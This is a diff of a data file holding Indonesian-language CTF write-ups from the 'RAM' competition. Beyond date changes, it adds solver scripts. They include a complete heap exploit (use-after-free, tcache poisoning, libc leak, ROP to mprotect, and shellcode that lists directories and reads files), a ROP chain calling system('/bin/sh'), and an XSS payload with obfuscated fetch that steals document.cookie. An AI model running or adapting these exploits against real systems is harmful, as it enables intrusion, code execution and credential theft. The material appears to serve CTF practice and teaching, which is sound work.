found\")\r\n    level_s, total_s, time_s, grid_s = matches[-1].groups()\r\n    return int(level_s), int(total_s), int(time_s), grid_s.strip().splitlines()\r\n\r\n\r\ndef main() -> None:\r\n    with socket.create_connection((HOST, PORT), timeout=5) as sock:\r\n        sock.settimeout(0.5)\r\n\r\n        banner = recv_until(sock, (\"Press Enter to start...\",), timeout=5)\r\n        if \"Press Enter to start...\" not in banner:\r\n            raise RuntimeError(\"unexpected banner\")\r\n        sock.sendall(b\"\\n\")\r\n\r\n        while True:\r\n            screen = recv_until(sock, (\"Move(s): \", \"Flag:\", \"RAM{\", \"RMCTF{\"))\r\n            flag = FLAG_RE.search(screen)\r\n            if flag:\r\n                print(flag.group(0))\r\n                return\r\n\r\n            level, total, time_left, grid = parse_frame(screen)\r\n            path = bfs(grid)\r\n            print(f\"[+] Level {level}/{total} | t={time_left}s | path={len(path)}\", file=sys.stderr)\r\n            sock.sendall(path.encode() + b\"\\n\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
@@ -652,7 +323,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Misc",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -670,6 +341,11 @@ RAM{M0rPH063N371C_F131D}`,
         "content": "Ambil salah satu daftar `encoded` meeting, hitung durasi tiap interval dalam menit, lalu konversi setiap durasi menjadi karakter ASCII.\n\nDurasi lengkapnya:\n\n`[82, 77, 67, 84, 70, 123, 78, 79, 95, 77, 79, 82, 69, 95, 83, 84, 65, 78, 68, 85, 80, 83, 125]`\n\nHasil decode:\n\n`RMCTF{NO_MORE_STANDUPS}`"
       },
       {
+        "title": "Solver",
+        "content": "File [solve.py](/home/nata/ctf/RAM/misc/SchedulingShenanigans/solve.py) akan:\n\n1. Connect ke service\n2. Menerima JSON penuh\n3. Mengambil meeting `encoded`\n4. Mengubah durasi meeting menjadi karakter ASCII\n5. Mencetak flag\n\nJalankan dengan:\n\n\n\nOutput:",
+        "code": "python3 solve.py"
+      },
+      {
         "title": "Solver Script",
         "content": "The complete exploit/solver script (solve.py) is provided below:",
         "code": "#!/usr/bin/env python3\r\nimport json\r\nimport socket\r\nfrom datetime import datetime\r\n\r\nHOST = \"10.42.5.10\"\r\nPORT = 1337\r\nTIME_FORMAT = \"%Y-%m-%dT%H:%M\"\r\n\r\n\r\ndef recv_all(host: str, port: int) -> bytes:\r\n    data = bytearray()\r\n    with socket.create_connection((host, port), timeout=5) as sock:\r\n        while True:\r\n            chunk = sock.recv(4096)\r\n            if not chunk:\r\n                break\r\n            data.extend(chunk)\r\n    return bytes(data)\r\n\r\n\r\ndef decode_flag(payload: dict) -> str:\r\n    encoded = [m for m in payload[\"employees\"][0][\"meetings\"] if m.get(\"encoded\")]\r\n    chars = []\r\n    for meeting in encoded:\r\n        start = datetime.strptime(meeting[\"start\"], TIME_FORMAT)\r\n        end = datetime.strptime(meeting[\"end\"], TIME_FORMAT)\r\n        duration = int((end - start).total_seconds() // 60)\r\n        chars.append(chr(duration))\r\n    return \"\".join(chars)\r\n\r\n\r\ndef main() -> None:\r\n    raw = recv_all(HOST, PORT)\r\n    payload = json.loads(raw)\r\n    print(decode_flag(payload))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
@@ -685,7 +361,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "OSINT",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -729,7 +405,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Pwn",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -792,12 +468,22 @@ RAM{M0rPH063N371C_F131D}`,
         "content": "Shellcode pertama melakukan:\n\n- `openat(AT_FDCWD, \".\", O_DIRECTORY, 0)`\n- `getdents64`\n- `write(1, buf, len)`\n\nDari output ini terlihat nama file flag:\n\n`flaguWSz45p3OjxUW3GaTTpV9VoHOREE5godifEBLjFMk.txt`"
       },
       {
+        "title": "Solver",
+        "content": "File solver final ada di:\n\n- [solve.py](/home/nata/ctf/RAM/pwn/AIRecreation/solve.py)\n\nSolver default sekarang melakukan semuanya otomatis:\n\n1. connect ke remote\n2. exploit sampai dapat arbitrary read/write\n3. leak PIE\n4. leak libc\n5. stack pivot\n6. jalankan shellcode listing\n7. parse nama file flag dari output `getdents64`\n8. jalankan shellcode kedua untuk membaca file flag\n\nKalau mau menjalankan manual nanti:\n\n\n\nMode debug juga masih saya sisakan lewat environment variable:\n\n- `SC_MODE=marker` untuk cek shellcode sudah tereksekusi\n- `SC_MODE=ls` untuk dump isi direktori\n- `SC_MODE=mmapfile FLAG_PATH=/path/file` untuk baca file tertentu",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py ./challenge"
+      },
+      {
         "title": "Catatan Penting",
         "content": "- Exploit ini tetap punya unsur retry karena semua write harus lolos dari larangan byte newline.\n- Solver sudah menangani itu dengan loop retry.\n- File `libc_remote.so.6` disimpan di folder yang sama karena offset libc remote memang berbeda dari libc lokal."
       },
       {
         "title": "Penutup",
         "content": "Inti challenge ini bukan sekadar satu bug tunggal, tapi bagaimana beberapa bug kecil saling melengkapi:\n\n- UAF memberi leak heap\n- tcache poisoning memberi overlap ke objek `user`\n- overlap memberi arbitrary read/write\n- callback pointer memberi titik kontrol\n- `WIPFeedback` memberi pivot\n- ROP singkat membuka jalan ke shellcode\n\nBegitu jalur itu stabil, sisanya tinggal memilih metode baca file yang paling tahan terhadap pembatasan input. Di challenge ini, kombinasi `mprotect + shellcode + mmap` adalah jalur yang paling rapi."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport os\r\nimport re\r\nimport struct\r\nimport subprocess\r\nimport sys\r\nfrom pwn import asm, context, remote\r\n\r\n# Remote solver for AI Recreation.\r\n# Usage:\r\n#   source /home/nata/ctf_env/bin/activate\r\n#   python3 solve.py [./challenge]\r\n\r\nDEFAULT_CANDIDATES = [\"./challenge\", \"./challenge (4)\"]\r\nHOST = \"10.42.5.10\"\r\nPORT = 1337\r\nREMOTE_LIBC = \"./libc_remote.so.6\"\r\nMAX_ATTEMPTS = 120\r\n\r\n# Fixed offsets inside the challenge binary are also recovered dynamically below.\r\nUSER_CHUNK_DELTA = 0xC0\r\nTARGET_BACK_OFFSET = 0x40\r\nPUTS_WRITE_LEN = 0x200\r\ncontext.arch = \"amd64\"\r\n\r\n\r\ndef p64(x: int) -> bytes:\r\n    return struct.pack(\"<Q\", x & 0xffffffffffffffff)\r\n\r\n\r\ndef u64(data: bytes) -> int:\r\n    return struct.unpack(\"<Q\", data[:8].ljust(8, b\"\\x00\"))[0]\r\n\r\n\r\nclass Retry(Exception):\r\n    pass\r\n\r\n\r\nclass Tube:\r\n    def __init__(self):\r\n        self.io = remote(HOST, PORT)\r\n\r\n    def recv_until(self, marker: bytes, timeout: float = 0.8) -> bytes:\r\n        return self.io.recvuntil(marker, timeout=timeout)\r\n\r\n    def send(self, data: bytes) -> None:\r\n        self.io.send(data)\r\n\r\n    def sendline(self, data) -> None:\r\n        if isinstance(data, str):\r\n            data = data.encode()\r\n        self.send(data + b\"\\n\")\r\n\r\n    def drain(self, timeout: float = 1.5) -> bytes:\r\n        return self.io.recvall(timeout=timeout)\r\n\r\n    def close(self) -> None:\r\n        try:\r\n            self.io.close()\r\n        except Exception:\r\n            pass\r\n\r\n\r\ndef run_cmd(args) -> str:\r\n    return subprocess.check_output(args, stderr=subprocess.DEVNULL).decode(\"latin-1\")\r\n\r\n\r\ndef resolve_binary() -> str:\r\n    if len(sys.argv) > 1:\r\n        path = sys.argv[1]\r\n    else:\r\n        path = next((p for p in DEFAULT_CANDIDATES if os.path.exists(p)), None)\r\n        if path is None:\r\n            raise SystemExit(\"Binary not found. Run: python3 solve.py ./challenge\")\r\n    path = os.path.abspath(path)\r\n    os.chmod(path, os.stat(path).st_mode | 0o111)\r\n    return path\r\n\r\n\r\ndef symbol_offset(path: str, symbol: str) -> int:\r\n    out = run_cmd([\"readelf\", \"-sW\", path])\r\n    for line in out.splitlines():\r\n        if re.search(rf\"\\b{re.escape(symbol)}@@\", line) or re.search(rf\"\\b{re.escape(symbol)}$\", line):\r\n            parts = line.split()\r\n            if len(parts) >= 2:\r\n                return int(parts[1], 16)\r\n    raise RuntimeError(f\"symbol {symbol} not found in {path}\")\r\n\r\n\r\ndef binary_text_symbol(binary: str, name_fragment: str) -> int:\r\n    out = run_cmd([\"nm\", \"-C\", binary])\r\n    for line in out.splitlines():\r\n        if name_fragment in line:\r\n            return int(line.split()[0], 16)\r\n    raise RuntimeError(f\"binary symbol containing {name_fragment!r} not found\")\r\n\r\n\r\ndef got_offset(binary: str, symbol: str) -> int:\r\n    out = run_cmd([\"readelf\", \"-rW\", binary])\r\n    for line in out.splitlines():\r\n        if f\"{symbol}@\" in line:\r\n            return int(line.split()[0], 16)\r\n    raise RuntimeError(f\"GOT relocation for {symbol} not found\")\r\n\r\n\r\ndef text_section(path: str):\r\n    out = run_cmd([\"readelf\", \"-SW\", path])\r\n    for line in out.splitlines():\r\n        if \" .text \" in line:\r\n            # [15] .text PROGBITS <addr> <off> <size> ...\r\n            parts = line.split()\r\n            addr = int(parts[3], 16)\r\n            off = int(parts[4], 16)\r\n            size = int(parts[5], 16)\r\n            return addr, off, size\r\n    raise RuntimeError(\".text section not found\")\r\n\r\n\r\ndef find_gadget(path: str, pattern: bytes) -> int:\r\n    vaddr, off, size = text_section(path)\r\n    data = open(path, \"rb\").read()\r\n    idx = data.find(pattern, off, off + size)\r\n    if idx < 0:\r\n        raise RuntimeError(f\"gadget {pattern.hex()} not found in {path}\")\r\n    return vaddr + (idx - off)\r\n\r\n\r\ndef protect_ptr(pos: int, ptr: int) -> int:\r\n    return (pos >> 12) ^ ptr\r\n\r\n\r\ndef decode_tcache_pair(encoded: int) -> int | None:\r\n    # We leak N1->fd where fd protects N2 and N2 == N1 + 0xc0.\r\n    # Usually encoded = N2 ^ (N2 >> 12). If the +0xc0 crosses a page,\r\n    # pos_page is one less than N2's page, so try both cases.\r\n    for carry in (0, 1):\r\n        y = encoded\r\n        for _ in range(32):\r\n            y = encoded ^ ((y >> 12) - carry)\r\n        n1 = y - USER_CHUNK_DELTA\r\n        if n1 % 0x10 == 0 and ((n1 >> 12) ^ (n1 + USER_CHUNK_DELTA)) == encoded:\r\n            return n1\r\n    return None\r\n\r\n\r\ndef no_newline(data: bytes, what: str) -> bytes:\r\n    # All writes through scanf(\"%[^\\n]\") must avoid literal newline bytes.\r\n    # ASLR makes pointer bytes vary, so the solver simply retries on unlucky runs.\r\n    if b\"\\n\" in data:\r\n        raise Retry(f\"newline byte in {what}\")\r\n    return data\r\n\r\n\r\ndef make_shellcode(mode: str, path: bytes = b\"./flag.txt\") -> bytes:\r\n    if mode == \"marker\":\r\n        sc = asm(\r\n            \"\"\"\r\n            mov edi, 1\r\n            lea rsi, [rip + msg]\r\n            mov edx, 8\r\n            mov eax, 1\r\n            syscall\r\n            xor edi, edi\r\n            mov eax, 60\r\n            syscall\r\n        msg:\r\n            .ascii \"SCOKOK!!\"\r\n            \"\"\"\r\n        )\r\n        return no_newline(sc, \"shellcode\")\r\n\r\n    if mode == \"ls\":\r\n        sc = asm(\r\n            \"\"\"\r\n            xor edi, edi\r\n            mov dil, 100\r\n            neg edi\r\n            lea rsi, [rip + path]\r\n            mov edx, 0x10000\r\n            xor r10d, r10d\r\n            mov eax, 257\r\n            syscall\r\n            mov edi, eax\r\n            lea rsi, [rip + buf]\r\n            mov edx, 0x400\r\n            mov eax, 217\r\n            syscall\r\n            mov edx, eax\r\n            mov edi, 1\r\n            lea rsi, [rip + buf]\r\n            mov eax, 1\r\n            syscall\r\n            xor edi, edi\r\n            mov eax, 60\r\n            syscall\r\n        path:\r\n            .ascii \".\"\r\n            .byte 0\r\n        buf:\r\n            \"\"\"\r\n        )\r\n        return no_newline(sc, \"shellcode\")\r\n\r\n    if mode == \"mmapfile\":\r\n        if b\"\\n\" in path or b\"\\x00\" in path:\r\n            raise ValueError(\"flag path must not contain newline or NUL\")\r\n        sc = asm(\r\n            f\"\"\"\r\n            xor edi, edi\r\n            mov dil, 100\r\n            neg edi\r\n            lea rsi, [rip + path]\r\n            xor edx, edx\r\n            xor r10d, r10d\r\n            mov eax, 257\r\n            syscall\r\n            mov r8, rax\r\n            mov edi, 0x13370000\r\n            mov esi, 0x1000\r\n            mov edx, 1\r\n            mov r10d, 2\r\n            xor r9d, r9d\r\n            mov eax, 9\r\n            syscall\r\n            mov edi, 1\r\n            mov rsi, rax\r\n            mov edx, 0x200\r\n            mov eax, 1\r\n            syscall\r\n            xor edi, edi\r\n            mov eax, 60\r\n            syscall\r\n        path:\r\n            .ascii \"{path.decode()}\"\r\n            .byte 0\r\n            \"\"\"\r\n        )\r\n        return no_newline(sc, \"shellcode\")\r\n\r\n    if b\"\\n\" in path or b\"\\x00\" in path:\r\n        raise ValueError(\"flag path must not contain newline or NUL\")\r\n\r\n    sc = asm(\r\n        f\"\"\"\r\n        xor edi, edi\r\n        mov dil, 100\r\n        neg edi\r\n        lea rsi, [rip + path]\r\n        xor edx, edx\r\n        xor r10d, r10d\r\n        mov eax, 257\r\n        syscall\r\n        mov edi, eax\r\n        lea rsi, [rip + buf]\r\n        mov edx, 0x200\r\n        xor eax, eax\r\n        syscall\r\n        mov edx, eax\r\n        mov edi, 1\r\n        lea rsi, [rip + buf]\r\n        mov eax, 1\r\n        syscall\r\n        xor edi, edi\r\n        mov eax, 60\r\n        syscall\r\n    path:\r\n        .ascii \"{path.decode()}\"\r\n        .byte 0\r\n    buf:\r\n        \"\"\"\r\n    )\r\n    return no_newline(sc, \"shellcode\")\r\n\r\n\r\ndef exploit_once(binary: str, info: dict, attempt: int, shellcode_mode: str, shellcode_path: bytes = b\"./flag.txt\") -> bytes:\r\n    tube = Tube()\r\n\r\n    def main_opt(n: int) -> None:\r\n        tube.recv_until(b\"Option> \")\r\n        tube.sendline(str(n))\r\n\r\n    def note_opt(n: int) -> None:\r\n        tube.recv_until(b\"Option> \")\r\n        tube.sendline(str(n))\r\n\r\n    def new_user(name: bytes = b\"Alice\") -> None:\r\n        main_opt(1)\r\n        tube.recv_until(b\"Your username: \")\r\n        tube.sendline(name)\r\n\r\n    def create_note(content: bytes | None = None) -> None:\r\n        main_opt(2)\r\n        if content is not None:\r\n            note_opt(2)\r\n            tube.recv_until(b\"New bet prediction: \")\r\n            tube.send(no_newline(content, \"note content\") + b\"\\n\")\r\n        note_opt(4)\r\n\r\n    def access_note(idx: int) -> None:\r\n        main_opt(3)\r\n        tube.recv_until(b\"Bet ID: \")\r\n        tube.sendline(str(idx))\r\n\r\n    def edit_current(payload: bytes) -> None:\r\n        note_opt(2)\r\n        tube.recv_until(b\"New bet prediction: \")\r\n        tube.send(no_newline(payload, \"edit payload\") + b\"\\n\")\r\n\r\n    def edit_note(idx: int, payload: bytes) -> None:\r\n        access_note(idx)\r\n        edit_current(payload)\r\n        note_opt(4)\r\n\r\n    def delete_note(idx: int) -> None:\r\n        access_note(idx)\r\n        note_opt(3)\r\n\r\n    def show_current() -> bytes:\r\n        note_opt(1)\r\n        out = tube.recv_until(b\"Option> \")\r\n        marker = out.find(b\"1) Show bet\")\r\n        if marker == -1:\r\n            marker = len(out)\r\n        return out[:marker].rstrip(b\"\\n\")\r\n\r\n    def show_note(idx: int) -> bytes:\r\n        access_note(idx)\r\n        leak = show_current()\r\n        # show_current already consumed the next note-menu prompt.\r\n        tube.sendline(\"4\")\r\n        return leak\r\n\r\n    try:\r\n        # Build three adjacent chunks. Deleting N2 then N1 keeps N1 accessible\r\n        # through the stale pointer and leaks N1->fd, which encodes N2.\r\n        new_user()\r\n        create_note(b\"A\" * 8)\r\n        create_note(b\"B\" * 8)\r\n        create_note(b\"C\" * 8)\r\n        delete_note(2)\r\n        delete_note(1)\r\n\r\n        heap_leak = show_note(1)\r\n        if len(heap_leak) < 6:\r\n            raise Retry(f\"short heap leak: {heap_leak.hex()}\")\r\n        n1 = decode_tcache_pair(u64(heap_leak[:6]))\r\n        if n1 is None:\r\n            raise Retry(f\"cannot decode heap leak: {heap_leak.hex()}\")\r\n\r\n        user = n1 - USER_CHUNK_DELTA\r\n        target = user - TARGET_BACK_OFFSET\r\n\r\n        # Tcache poison: first allocation returns N1, second returns target=user-0x40.\r\n        edit_note(1, p64(protect_ptr(n1, target)))\r\n        create_note(None)\r\n\r\n        # The fake chunk starts 0x40 bytes before the user object. Its constructor\r\n        # clears the pointer array but preserves callback/count. Rebuild enough of\r\n        # the pointer table so note 1 points at user->callback and note 3 points\r\n        # back to the fake chunk for repeated arbitrary writes.\r\n        main_opt(2)\r\n        edit_current(no_newline(b\"X\" * 0x40 + p64(user + 0x80) + p64(0) + p64(target), \"fake ptrs\"))\r\n        note_opt(4)\r\n\r\n        pie_leak = show_note(1)\r\n        if len(pie_leak) < 6:\r\n            raise Retry(f\"short PIE leak: {pie_leak.hex()}\")\r\n        callback = u64(pie_leak[:6])\r\n        pie_base = callback - info[\"print_user\"]\r\n        if pie_base & 0xfff or pie_base < 0x500000000000:\r\n            raise Retry(f\"bad PIE base: {pie_base:#x}\")\r\n\r\n        wip_feedback = pie_base + info[\"wip\"]\r\n        puts_got = pie_base + info[\"puts_got\"]\r\n\r\n        # Leak libc through puts@got.\r\n        edit_note(3, no_newline(b\"Y\" * 0x40 + p64(puts_got) + p64(0) + p64(target), \"puts got ptr\"))\r\n        libc_leak = show_note(1)\r\n        if len(libc_leak) < 6:\r\n            raise Retry(f\"short libc leak: {libc_leak.hex()}\")\r\n        puts_addr = u64(libc_leak[:6])\r\n        libc_base = puts_addr - info[\"libc_puts\"]\r\n        if libc_base & 0xfff or libc_base < 0x700000000000:\r\n            raise Retry(f\"bad libc base: {libc_base:#x}\")\r\n\r\n        pop_rdi = libc_base + info[\"pop_rdi\"]\r\n        pop_rsi = libc_base + info[\"pop_rsi\"]\r\n        pop_rdx = libc_base + info[\"pop_rdx\"]\r\n        ret = libc_base + info[\"ret\"]\r\n        mprotect = libc_base + info[\"mprotect\"]\r\n\r\n        shellcode = make_shellcode(shellcode_mode, shellcode_path)\r\n        shell_addr = (user + 0x800) & ~0xf\r\n        fake_rbp = (user + 0x600) & ~0xf\r\n        frame_base = fake_rbp - 0x50\r\n        heap_page = shell_addr & ~0xfff\r\n\r\n        # Write shellcode to heap.\r\n        edit_note(3, no_newline(b\"Z\" * 0x40 + p64(shell_addr) + p64(0) + p64(target), \"shell ptr\"))\r\n        edit_note(1, shellcode)\r\n\r\n        # Main epilogue after WIPFeedback will pivot to fake_rbp-0x10.\r\n        rop = b\"\".join(\r\n            p64(x)\r\n            for x in [\r\n                ret,\r\n                pop_rdi,\r\n                heap_page,\r\n                pop_rsi,\r\n                0x2000,\r\n                pop_rdx,\r\n                7,\r\n                mprotect,\r\n                shell_addr,\r\n            ]\r\n        )\r\n        frame = bytearray(b\"Q\" * 0x58 + rop)\r\n        frame[0x38:0x40] = p64(0)  # fake main local user pointer, harmless\r\n        frame[0x40:0x48] = p64(0)  # pop rbx\r\n        frame[0x48:0x50] = p64(0)  # pop r12\r\n        frame[0x50:0x58] = p64(0)  # pop rbp\r\n\r\n        edit_note(3, no_newline(b\"W\" * 0x40 + p64(frame_base) + p64(0) + p64(target), \"frame ptr\"))\r\n        edit_note(1, no_newline(bytes(frame), \"ROP frame\"))\r\n\r\n        # Change callback to WIPFeedback. It reads 0x48 bytes into a 0x40-byte\r\n        # stack buffer, so the last qword becomes main's rbp.\r\n        edit_note(3, no_newline(b\"V\" * 0x40 + p64(user + 0x80) + p64(0) + p64(target), \"callback ptr\"))\r\n        edit_note(1, no_newline(p64(wip_feedback), \"WIPFeedback address\"))\r\n\r\n        tube.recv_until(b\"Feedback: \", timeout=2.0)\r\n        tube.send(b\"A\" * 64 + p64(fake_rbp))\r\n        tube.recv_until(b\"Option> \", timeout=2.0)\r\n        tube.sendline(\"4\")\r\n\r\n        out = tube.drain(2.0)\r\n        tube.close()\r\n        return out\r\n    except Exception:\r\n        tube.close()\r\n        raise\r\n\r\n\r\ndef parse_dirents64(data: bytes) -> list[str]:\r\n    names = []\r\n    off = 0\r\n    while off + 19 <= len(data):\r\n        reclen = struct.unpack_from(\"<H\", data, off + 16)[0]\r\n        if reclen < 19 or off + reclen > len(data):\r\n            break\r\n        name_raw = data[off + 19:off + reclen].split(b\"\\x00\", 1)[0]\r\n        try:\r\n            name = name_raw.decode(\"utf-8\", errors=\"ignore\")\r\n        except Exception:\r\n            name = \"\"\r\n        if name:\r\n            names.append(name)\r\n        off += reclen\r\n    return names\r\n\r\n\r\ndef find_flag_name(entries: list[str]) -> str | None:\r\n    patterns = [\r\n        re.compile(r\"^flag[a-zA-Z0-9_{}.:-]*\\.txt$\"),\r\n        re.compile(r\"^flag[a-zA-Z0-9_{}.:-]*$\"),\r\n        re.compile(r\".*flag.*\", re.IGNORECASE),\r\n    ]\r\n    for pattern in patterns:\r\n        for entry in entries:\r\n            if pattern.fullmatch(entry) or pattern.search(entry):\r\n                return entry\r\n    return None\r\n\r\n\r\ndef main() -> None:\r\n    binary = resolve_binary()\r\n    libc = os.path.abspath(REMOTE_LIBC)\r\n    if not os.path.exists(libc):\r\n        raise SystemExit(f\"Remote libc not found: {libc}\")\r\n\r\n    info = {\r\n        \"print_user\": binary_text_symbol(binary, \"printUserNameFn\"),\r\n        \"wip\": binary_text_symbol(binary, \"WIPFeedback\"),\r\n        \"puts_got\": got_offset(binary, \"puts\"),\r\n        \"libc_puts\": symbol_offset(libc, \"puts\"),\r\n        \"mprotect\": symbol_offset(libc, \"mprotect\"),\r\n        \"ret\": find_gadget(libc, b\"\\xc3\"),\r\n        \"pop_rdi\": find_gadget(libc, b\"\\x5f\\xc3\"),\r\n        \"pop_rsi\": find_gadget(libc, b\"\\x5e\\xc3\"),\r\n        \"pop_rdx\": find_gadget(libc, b\"\\x5a\\xc3\"),\r\n    }\r\n\r\n    print(f\"[*] binary: {binary}\", file=sys.stderr)\r\n    print(f\"[*] libc:   {libc}\", file=sys.stderr)\r\n\r\n    debug_mode = os.environ.get(\"SC_MODE\")\r\n    debug_path = os.environ.get(\"FLAG_PATH\", \"./flag.txt\").encode()\r\n\r\n    if debug_mode:\r\n        last = b\"\"\r\n        for attempt in range(MAX_ATTEMPTS):\r\n            try:\r\n                out = exploit_once(binary, info, attempt, debug_mode, debug_path)\r\n                last = out\r\n                cleaned = out.replace(b\"\\x00\", b\"\")\r\n                if cleaned:\r\n                    sys.stdout.buffer.write(cleaned)\r\n                    if not cleaned.endswith(b\"\\n\"):\r\n                        sys.stdout.buffer.write(b\"\\n\")\r\n                    sys.stdout.flush()\r\n                if cleaned:\r\n                    return\r\n            except Retry as e:\r\n                print(f\"[*] retry {attempt}: {e}\", file=sys.stderr)\r\n                continue\r\n            except (BrokenPipeError, EOFError, OSError) as e:\r\n                print(f\"[*] retry {attempt}: process ended early ({e})\", file=sys.stderr)\r\n                continue\r\n        print(\"[-] exploit did not produce output\", file=sys.stderr)\r\n        if last:\r\n            print(last.hex(), file=sys.stderr)\r\n        raise SystemExit(1)\r\n\r\n    entries: list[str] = []\r\n    for attempt in range(MAX_ATTEMPTS):\r\n        try:\r\n            listing = exploit_once(binary, info, attempt, \"ls\")\r\n            entries = parse_dirents64(listing)\r\n            flag_name = find_flag_name(entries)\r\n            if flag_name:\r\n                break\r\n        except Retry as e:\r\n            print(f\"[*] retry list {attempt}: {e}\", file=sys.stderr)\r\n            continue\r\n        except (BrokenPipeError, EOFError, OSError) as e:\r\n            print(f\"[*] retry list {attempt}: process ended early ({e})\", file=sys.stderr)\r\n            continue\r\n    else:\r\n        print(\"[-] failed to enumerate remote directory\", file=sys.stderr)\r\n        if entries:\r\n            print(entries, file=sys.stderr)\r\n        raise SystemExit(1)\r\n\r\n    flag_path = f\"/{flag_name}\".encode()\r\n    print(f\"[*] flag file: {flag_name}\", file=sys.stderr)\r\n\r\n    last = b\"\"\r\n    for attempt in range(MAX_ATTEMPTS):\r\n        try:\r\n            out = exploit_once(binary, info, attempt, \"mmapfile\", flag_path)\r\n            last = out\r\n            cleaned = out.replace(b\"\\x00\", b\"\")\r\n            if cleaned:\r\n                sys.stdout.buffer.write(cleaned)\r\n                if not cleaned.endswith(b\"\\n\"):\r\n                    sys.stdout.buffer.write(b\"\\n\")\r\n                sys.stdout.flush()\r\n            if cleaned:\r\n                return\r\n        except Retry as e:\r\n            print(f\"[*] retry read {attempt}: {e}\", file=sys.stderr)\r\n            continue\r\n        except (BrokenPipeError, EOFError, OSError) as e:\r\n            print(f\"[*] retry read {attempt}: process ended early ({e})\", file=sys.stderr)\r\n            continue\r\n\r\n    print(\"[-] exploit did not produce output\", file=sys.stderr)\r\n    if last:\r\n        print(last.hex(), file=sys.stderr)\r\n    raise SystemExit(1)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
     "terminalOutputs": [],
@@ -810,7 +496,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Pwn",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -858,7 +544,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Pwn",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -945,7 +631,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Pwn",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -980,6 +666,11 @@ RAM{M0rPH063N371C_F131D}`,
         "code": "stack+0x08 = ret gadget          (PIE + 0x1016)\nstack+0x10 = pop rdi; ret        (libc + 0x2a145)\nstack+0x18 = pointer \"/bin/sh\"   (libc + 0x1a5ea4)\nstack+0x20 = system              (libc + 0x53110)"
       },
       {
+        "title": "Cara jalanin",
+        "content": "Local:\n\n\n\nRemote:\n\n\n\nDefault command di solver akan mencoba baca flag:\n\n\n\nKalau mau shell interaktif tanpa auto command:",
+        "code": "python3 solve.py local"
+      },
+      {
         "title": "Catatan libc",
         "content": "Offset libc yang dipakai di solver berasal dari environment lokal yang dipakai waktu analisis:",
         "code": "__libc_start_main return leak : 0x29ca8\npop rdi; ret                  : 0x2a145\n/bin/sh                       : 0x1a5ea4\nsystem                        : 0x53110"
@@ -1000,7 +691,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Reverse",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -1066,7 +757,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Web",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -1114,7 +805,7 @@ RAM{M0rPH063N371C_F131D}`,
       },
       {
         "title": "Solver",
-        "content": "Berikut solver Python yang mereproduksi exploit tanpa perlu langkah manual:\n\n\n\n\n---",
+        "content": "Berikut solver Python yang mereproduksi exploit tanpa perlu langkah manual:\n\n\n\nFile solver sudah disiapkan sebagai [`solver.py`](/home/nata/ctf/RAM/web/Covbooks/solver.py).\n\n---",
         "code": "#!/usr/bin/env python3\nimport html\nimport re\nimport sys\nimport time\nfrom urllib.parse import quote, unquote\nfrom urllib.request import Request, urlopen\n\nBASE_URL = \"http://10.42.5.10\"\n\ndef http_request(path, method=\"GET\", data=None, timeout=10):\n    url = f\"{BASE_URL}{path}\"\n    body = None\n    headers = {}\n    if data is not None:\n        body = data.encode()\n        headers[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\n\n    req = Request(url, data=body, method=method, headers=headers)\n    with urlopen(req, timeout=timeout) as resp:\n        return resp.read().decode(\"utf-8\", errors=\"replace\")\n\ndef clear_messages():\n    http_request(\"/messages.php?clear=1\")\n\ndef build_payload():\n    js = (\n        \"fetch(String.fromCharCode(47,109,101,115,115,97,103,101,115,46,112,104,112),\"\n        \"{method:String.fromCharCode(80,79,83,84),\"\n        \"body:new(URLSearchParams)({msg:document.cookie})})\"\n    )\n    injected = f'\\\" autofocus onfocus={js} x=\\\"'\n    return quote(injected, safe=\"\")\n\ndef submit_report():\n    payload = build_payload()\n    target = f\"http://localhost:8080/?q={payload}\"\n    data = \"url=\" + quote(target, safe=\"\")\n    return http_request(\"/report.php\", method=\"POST\", data=data)\n\ndef extract_entries(page):\n    pattern = re.compile(r'<div class=\\\"entry\\\">\\\\[[^\\\\]]+\\\\] msg=(.*?)</div>', re.DOTALL)\n    return [html.unescape(match) for match in pattern.findall(page)]\n\ndef find_flag(entries):\n    for entry in entries:\n        decoded = unquote(entry)\n        flag_match = re.search(r\"RAM\\\\{[^}]+\\\\}\", decoded)\n        if flag_match:\n            return flag_match.group(0)\n\n        cookie_match = re.search(r\"flag=([^;]+)\", decoded)\n        if cookie_match:\n            maybe_flag = unquote(cookie_match.group(1))\n            flag_match = re.search(r\"RAM\\\\{[^}]+\\\\}\", maybe_flag)\n            if flag_match:\n                return flag_match.group(0)\n    return None\n\ndef poll_flag(max_attempts=20, 